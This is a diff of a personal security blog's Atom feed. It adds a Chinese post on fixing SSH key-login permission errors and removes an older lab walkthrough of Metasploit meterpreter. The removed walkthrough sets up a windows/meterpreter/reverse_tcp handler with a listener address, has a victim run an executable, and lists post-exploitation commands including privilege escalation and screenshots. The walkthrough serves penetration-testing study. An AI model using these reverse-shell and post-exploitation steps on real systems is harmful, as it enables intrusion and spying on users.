@@ -6,7 +6,7 @@
   <link href="https://0xchang.github.io/atom.xml" rel="self"/>
   
   <link href="https://0xchang.github.io/"/>
-  <updated>2022-02-14T14:17:42.462Z</updated>
+  <updated>2022-03-06T14:14:58.448Z</updated>
   <id>https://0xchang.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ssh文件权限问题</title>
+    <link href="https://0xchang.github.io/2022/03/06/ssh%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/"/>
+    <id>https://0xchang.github.io/2022/03/06/ssh%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/</id>
+    <published>2022-03-06T12:07:17.000Z</published>
+    <updated>2022-03-06T14:14:58.448Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="ssh文件权限问题"><a href="#ssh文件权限问题" class="headerlink" title="ssh文件权限问题"></a>ssh文件权限问题</h2><h3 id="0x00-权限过高"><a href="#0x00-权限过高" class="headerlink" title="0x00 权限过高"></a>0x00 权限过高</h3><p>今天使用mobaxterm生成的公钥的上传到服务器，准备登陆时反馈信息，server refused our key，主要原因是~/.ssh文件夹权限过高导致的问题，authorized_keys文件我给的权限是644，.ssh文件夹我给的权限是755，最后使用密钥登录成功。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;ssh文件权限问题&quot;&gt;&lt;a href=&quot;#ssh文件权限问题&quot; class=&quot;headerlink&quot; title=&quot;ssh文件权限问题&quot;&gt;&lt;/a&gt;ssh文件权限问题&lt;/h2&gt;&lt;h3 id=&quot;0x00-权限过高&quot;&gt;&lt;a href=&quot;#0x00-权限过高&quot; class</summary>
+      
+    
+    
+    
+    
+    <category term="-ssh -权限 -远程ssh连接" scheme="https://0xchang.github.io/tags/ssh-%E6%9D%83%E9%99%90-%E8%BF%9C%E7%A8%8Bssh%E8%BF%9E%E6%8E%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>rust修改默认环境变量与源</title>
@@ -495,30 +517,6 @@
     <category term="后门" scheme="https://0xchang.github.io/tags/%E5%90%8E%E9%97%A8/"/>
     
     <category term="漏洞" scheme="https://0xchang.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>metasploit之meterpreter命令</title>
-    <link href="https://0xchang.github.io/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/"/>
-    <id>https://0xchang.github.io/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</id>
-    <published>2021-12-21T04:22:46.000Z</published>
-    <updated>2022-02-11T11:59:47.919Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p><p>输入<code>exploit -j</code>运行脚本，且在后台监听</p><p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p><p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p><p>执行<code>ps</code>查看进程</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p><p><code>getuid</code> 查看权限</p><p><code>pwd</code> 查看当前路径</p><p><code>screentshot</code>截图</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p><p><code>background</code>会话转入后台</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p><p>新建终端，进入/root目录下，查看截图</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p><p>实验结束</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;metasploit之meterpreter命令&quot;&gt;&lt;a href=&quot;#metasploit之meterpreter命令&quot; class=&quot;headerlink&quot; title=&quot;metasploit之meterpreter命令&quot;&gt;&lt;/a&gt;metasploit之met</summary>
-      
-    
-    
-    
-    
-    <category term="msf" scheme="https://0xchang.github.io/tags/msf/"/>
-    
-    <category term="meterpreter" scheme="https://0xchang.github.io/tags/meterpreter/"/>
     
   </entry>
   
